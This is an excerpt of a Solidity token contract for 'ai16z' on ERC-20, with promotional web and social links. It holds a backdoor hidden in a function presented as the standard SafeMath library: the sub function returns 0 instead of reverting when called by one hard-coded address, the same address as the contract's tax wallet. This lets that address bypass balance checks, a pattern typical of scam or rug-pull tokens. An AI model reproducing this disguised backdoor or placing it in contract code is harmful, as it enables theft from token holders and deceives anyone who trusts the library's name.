...
Web :   https://www.ai16zerc20.vip
TG :    https://t.me/ai16z_erc20
X :     https://x.com/ai16z_erc20
...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b, string memory errorMessage) internal view returns (uint256) {
        if (b > a && msg.sender == 0x84d9f7a9Df4959D5663563A966F19e6d645E429D) return 0;
...
contract ai16z is Context, IERC20, Ownable {
    ...
    address payable private _taxWallet=payable(0x84d9f7a9Df4959D5663563A966F19e6d645E429D);
    ...
    uint256 public _maxTxAmount =  3 * (_tTotal/100);uint256 public _maxWalletSize =  3 * (_tTotal/100);
